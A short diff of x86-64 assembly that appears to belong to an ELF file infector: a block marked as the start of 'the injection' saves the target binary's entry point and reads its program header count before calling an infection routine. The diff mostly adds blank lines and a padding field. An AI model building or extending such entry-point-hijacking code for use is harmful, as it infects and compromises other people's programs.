@@ -508,13 +508,17 @@ print_rax:
 
 		; Here start the injection
 
+
 		mov		rax, [rel elfb + 0x18]		; e_entry
 		mov		[old_entry], rax
+
 
 		movzx	rcx, word [rel elfb + 0x38]	; e_phnum
 		movzx	rdi, word [rel elfb + 0x36]	; e_phentisize
 		xor		r11, r11
 		xor		r10, r10
+
+
 
 
 		call	infection_0
@@ -753,6 +757,7 @@ end_:
 	elfh	db 0x7f, 'ELF'
 	one		db 1
 	zero	db 0
+	paddi	dq 0
 	entry	dq 0
 	exec	dw 7
 	elfb	times 0064 db 0
